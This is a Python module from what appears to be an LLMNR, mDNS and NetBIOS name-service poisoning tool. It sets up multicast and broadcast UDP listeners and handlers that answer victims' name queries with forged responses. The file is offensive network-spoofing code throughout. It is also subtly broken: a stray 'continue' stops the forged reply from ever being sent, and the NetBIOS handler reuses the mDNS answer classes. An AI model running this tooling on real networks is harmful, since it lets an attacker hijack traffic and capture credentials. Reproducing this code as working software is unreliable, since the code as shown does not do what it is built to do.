import ssl
import typing as T
from socketserver import (
    ThreadingTCPServer, ThreadingUDPServer, BaseRequestHandler,
)
from threading import Thread
import struct
import socket
from copy import deepcopy

import ifcfg
import dns.message
import dns.exception

from .. import logging
from ..toolz import *
from .common import (
    has_ipv6, default_interface, IPV6, IPV4, Configuration,
    respond_to_ip, respond_to_name, client_ip, query_num_to_name,
    is_netbios_name, decode_netbios_name, from_latin,
)
from . import packets
from . import dns
from . import netbios

log = logging.new_log(__name__)

class ConfigMixin:
    config: Configuration
    @classmethod
    def from_config(cls, config: Configuration):
        return type(
            f'Instanced{cls.__name__}{dict_md5(config)}', 
            (cls,), {'config': deepcopy(config)},
        )


class PoisonerHandler(BaseRequestHandler, ConfigMixin):
    ipv4_packet_class: type
    ipv6_packet_class: type
    dns_message_class: T.Callable[[bytes], dns.DNSMessage] = dns.DNSMessage
    def handle(self):
        try:
            req_data, sock = self.request
            log.debug(f'Query data: {req_data}')

            try:
                message = self.dns_message_class(req_data)
            except dns.exception.FormError as form_exc:
                log.error(
                    f'Bad DNS message: {req_data}'
                )
                return

            pipe(message.to_text(), splitlines, map(log.debug), tuple)

            ip = client_ip(self.client_address)

            if not respond_to_ip(self.config, ip):
                log.warning(
                    f'Not responding to IP {ip}.'
                )
                return

            for question in message.question:
                name = question['name']

                if self.config['analyze_only']:
                    log.warning(
                        f'Analyze mode [MDNS]: {ip} {name}'
                    )
                    continue

                if not respond_to_name(self.config, name):
                    log.warning(
                        f'Not responding to name {name}.'
                    )
                    continue

                qtype = question['type']

                log.info(f'Got {qtype} request for name: {name} from IP: {ip}')

                packet: packets.Packet = None

                match qtype:
                    case 'A' | '*':
                        packet = self.ipv4_packet_class(self.config, req_data)
                    case 'AAAA':
                        packet = self.ipv6_packet_class(self.config, req_data)
                    case other:
                        log.debug(
                            f'Skipping {other} query.'
                        )
                        continue

                if packet:
                    continue
                    sock.sendto(packet.to_bytes(), self.client_address)
        except:
            log.exception(
                f'Error handling: {req_data}'
            )

class LLMNRHandler(PoisonerHandler):
    ipv4_packet_class = packets.LLMNRv4Answer
    ipv6_packet_class = packets.LLMNRv6Answer

class MDNSHandler(PoisonerHandler):
    ipv4_packet_class = packets.MDNSv4Answer
    ipv6_packet_class = packets.MDNSv6Answer

class NBTNSHandler(PoisonerHandler):
    ipv4_packet_class = packets.MDNSv4Answer
    ipv6_packet_class = packets.MDNSv6Answer
    dns_message_class: type = netbios.NBNSMessage

class MulticastServer(ThreadingUDPServer, ConfigMixin):
    ipv4_address: str
    ipv6_address: str

    allow_reuse_address = True
    address_family = socket.AF_INET6

    def server_bind(self):
        iface = self.config['interface']
        log.info(
            f'Binding {self.__class__.__name__} server to {iface["ipv4"]}'
        )
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)        
        self.socket.setsockopt(
            socket.IPPROTO_IP,
            socket.IP_ADD_MEMBERSHIP,
            socket.inet_aton(self.ipv4_address) + iface['ipv4_bytes']
        )

        if has_ipv6():
            mreq = socket.inet_pton(
                socket.AF_INET6, self.ipv6_address
            ) + iface['index_bytes']
            self.socket.setsockopt(
                socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq
            )
        
        self.socket.setsockopt(
            socket.SOL_SOCKET, 25, bytes(iface['device']+'\0', 'utf-8')
        )
        if has_ipv6():
            self.socket.setsockopt(
                socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False
            )
        ThreadingUDPServer.server_bind(self)

class LLMNRServer(MulticastServer):
    ipv4_address = '224.0.0.252'
    ipv6_address = 'FF02:0:0:0:0:0:1:3'

class MDNSServer(MulticastServer):
    ipv4_address = '224.0.0.251'
    ipv6_address = 'ff02::fb'

def serve_llmnr(config: Configuration):
    server = LLMNRServer.from_config(config)(
        ('', 5355), LLMNRHandler.from_config(config)
    )
    server.serve_forever()


def serve_mdns(config: Configuration):
    server = MDNSServer.from_config(config)(
        ('', 5353), MDNSHandler.from_config(config)
    )
    server.serve_forever()

class BroadcastUDPServer(ThreadingUDPServer, ConfigMixin):
    allow_reuse_address = True
    address_family = socket.AF_INET6

    def server_bind(self):
        iface = self.config['interface']
        log.info(
            f'Binding {self.__class__.__name__} server to {iface["ipv4"]}'
        )
        self.socket.setsockopt(
            socket.SOL_SOCKET, 25, bytes(iface['device']+'\0', 'utf-8')
        )
        if has_ipv6():
            self.socket.setsockopt(
                socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False
            )

        ThreadingUDPServer.server_bind(self)

class NBTNSServer(BroadcastUDPServer):
    pass


def serve_nbtns(config: Configuration):
    server = NBTNSServer.from_config(config)(
        ('', 137), NBTNSHandler.from_config(config)
    )
    server.serve_forever()

